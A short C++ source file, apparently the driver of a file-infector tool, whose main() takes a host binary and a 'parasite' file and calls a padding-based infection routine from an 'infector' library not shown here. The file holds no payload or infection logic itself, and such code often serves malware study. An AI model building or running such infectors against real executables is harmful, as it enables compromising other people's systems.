#include "infector/common.hh"
#include "infector/padding_infect.hh"
#include "std/stdio.hh"

// Usage %s <host> <parasite>
int main(int argc, char** argv) {
  if (argc != 3) {
    return EXIT_FAILURE;
  }

  if (vt::infector::infect<vt::infector::PaddingInfect>(argv[1], argv[2])) {
    return EXIT_SUCCESS;
  }
  return EXIT_FAILURE;
}